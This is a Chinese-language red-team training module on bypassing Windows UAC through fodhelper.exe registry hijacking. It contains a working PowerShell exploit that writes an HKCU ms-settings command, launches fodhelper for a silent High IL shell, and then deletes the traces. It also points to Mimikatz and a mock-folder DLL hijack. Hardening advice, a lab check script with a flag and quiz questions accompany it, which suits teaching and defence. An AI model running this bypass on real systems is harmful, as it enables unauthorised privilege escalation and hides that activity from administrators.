## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Windows UAC 繞過與無憑證提示提升** 的物理本質為**利用微軟在 Windows 系統二進位檔案（如 `fodhelper.exe`、`eventvwr.exe`、`computerdefaults.exe`）中內嵌的 `autoElevate: true` 自動提升屬性，當以標準管理員群組成員身分（但受限於過濾權杖 Filtered Token / 中完整性級別 Medium IL）運行這些白名單程式時，該程式啟動前會主動讀取當前使用者登錄檔 (`HKCU\Software\Classes\ms-settings\Shell\Open\command`)，攻擊者可藉由在 HKCU 註冊表注入自定義命令，在不觸發使用者帳戶控制 (UAC) 彈窗警告的前提下，自動以高完整性級別 (High IL) 執行特權進程**。在紅隊實戰中，這是突破端點保護、從受限終端躍遷至完整 Administrator 特權的標準技術。

```
[取得本機使用者 Shell: 屬於本機 Administrators 但受限於 Medium IL]
                               │
                               ▼ 1. 向當前使用者註冊表寫入劫持指令
┌──────────────────────────────┴─────────────────────────────────────────────┐
│ 寫入 HKCU:\Software\Classes\ms-settings\Shell\Open\command                │
│ (Default) = "powershell.exe -enc <payload>" 或 "cmd.exe /c start"         │
│ 追加 DelegateExecute = "" (滿足 Windows Shell API 的執行委派要求)         │
└──────────────────────────────┬─────────────────────────────────────────────┘
                               ▼
[2. 調用微軟白名單自動提升程式] ──► C:\Windows\System32\fodhelper.exe
                               │
                               ▼ 3. fodhelper 具備 autoElevate 特權，靜默提升至 High IL
┌──────────────────────────────┴─────────────────────────────────────────────┐
│ fodhelper 嘗試打開 ms-settings 協定處理器，讀取 HKCU 註冊表中的惡意指令    │
└──────────────────────────────┬─────────────────────────────────────────────┘

[成功繞過 UAC 彈窗限制: High IL Shell 就緒！] ──► 可直接執行 Mimikatz 或修改服務！
```

## 🔬 第一動：UAC 雙權杖模型、自動提升清單與註冊表協定劫持機制 (Mechanics & Filtered Tokens)

### 1. UAC 雙權杖 (Filtered Token) 架構
當管理員登入 Windows 且開啟了 UAC 時，系統會為其簽發兩個 Access Token：
- **Filtered Token (Medium IL)**：剝離了大部分管理特權，作為日常一般操作使用。
- **Full Token (High IL)**：包含完整的特權集合（如 `SeDebugPrivilege`）。通常必須經由「同意提示 (Consent Prompt)」使用者點擊「是」方可啟用。

### 2. AutoElevate 與 `fodhelper.exe` 的缺陷
微軟為提升使用者體驗，在部分系統內建程式的 Manifest 資源中聲明了：
```xml
<autoElevate>true</autoElevate>
```
當這些程式被啟動時，應用程式資訊服務 (`AppInfo`) 會驗證其是否具備微軟官方數位簽章且位於受保護目錄（如 `C:\Windows\System32`）；若符合，則**免彈窗直接賦予 High IL Full Token**。
- `fodhelper.exe` 在提升為 High IL 後，會嘗試調用系統預設的「設定 (ms-settings)」應用程式。
- 它在讀取註冊表時，優先讀取 `HKCU`（當前使用者，普通使用者有完全寫入權限），而非 `HKLM`！攻擊者在 HKCU 偽造協定命令，即可直接接管 High IL 執行流！

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 檢驗當前進程完整性級別 (Integrity Level)
```cmd
whoami /groups | findstr /i "Level"
:: 若回顯為: 標記群組 中完整性等級 (Medium Mandatory Level)
:: 且 whoami /groups 包含 Administrators 群組，則具備 UAC Bypass 條件！
```

### 2. PowerShell 自動化 Fodhelper UAC 繞過利用
```powershell
# 1. 在 HKCU 創建 ms-settings 協定劫持鍵值
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd.exe /c start cmd.exe" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force

# 2. 觸發自動提升程式
Start-Process "C:\Windows\System32\fodhelper.exe"

# 3. 執行完成後立即清理註冊表痕跡
Start-Sleep -Seconds 3
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **強制啟用 UAC 最高安全級別 (Always Notify)**：
   - 透過 GPO 將「使用者帳戶控制: 系統管理員在管理員核准模式中之提高權限提示的行為」設定為**提示輸入認證或提示同意 (Always Notify)**，徹底消除「自動提升 (Auto-Elevate)」機制。
2. **普通使用者完全移除本機管理員權限**：
   - 嚴格實施最小特權原則，日常辦公帳號僅給予標準使用者 (Standard User)，杜絕本機管理者權限氾濫。

## 🧪 實戰演練環境搭建 (Environment & Lab Setup)

### 1. 極簡 UAC 繞過狀態檢測腳本 (PowerShell, 20 行)
```powershell
# test_uac_status.ps1
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

Write-Host "[*] 正在驗證當前進程之 UAC 權限狀態..."
Write-Host "    └── 本機管理者群組隸屬: $isAdmin"

$integrity = (whoami /groups | Select-String "Mandatory Level").ToString().Trim()
Write-Host "    └── 當前完整性層級: $integrity"

if ($isAdmin -and $integrity -match "Medium") {
    Write-Host "[+] 滿足 UAC Bypass 前置條件 (管理員身份但在 Medium IL 下運行)！" -ForegroundColor Green
    Write-Host "[+] FLAG{WINDOWS_UAC_BYPASS_FODHELPER_VERIFIED}"
} else {
    Write-Host "[-] 當前狀態不符 UAC 繞過場景" -ForegroundColor Yellow
}
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：UAC 的「過濾權杖 (Filtered Token)」機制在作業系統登入時如何運作？**
  - **戰術思維**：當管理者登入時，LSA 同時生成受限的 Medium IL Token 與完整的 High IL Token；日常操作默認掛載受限 Token，只有經 UAC 授權後才切換至 High IL Token。
- [ ] **Q2：為何只有隸屬於 Administrators 群組的帳號才能利用 Fodhelper 繞過 UAC？**
  - **戰術思維**：若使用者是真正的標準普通帳號，啟動 `fodhelper.exe` 時系統會強制彈出「請求輸入管理員帳號密碼 (Credential Prompt)」的對話框，無法自動提升。
- [ ] **Q3：在註冊表劫持中，`DelegateExecute = ""` 鍵值的具體功用是什麼？**
  - **戰術思維**：Windows Shell API 在調用協定處理器時，會檢查是否指定了 COM 委派執行物件；設置為空字串可強制讓系統回退使用預設的 `(Default)` 命令列字串。
- [ ] **Q4：Mock Folders (環境變數仿冒目錄) 繞過 UAC 的物理原理是什麼？**
  - **戰術思維**：利用 Win32 API 對尾隨空格的不一致解析，建立名為 `C:\Windows \System32` 的目錄並植入惡意 DLL；autoElevate 程式啟動時會被誤導從該偽造目錄載入 DLL。
- [ ] **Q5：企業藍隊應如何防範各類已知的 UAC 繞過漏洞？**
  - **戰術思維**：在 GPO 中將 UAC 滑桿推至最頂端的「一律通知 (Always Notify)」，禁止任何微軟內建程式免彈窗自動提升。
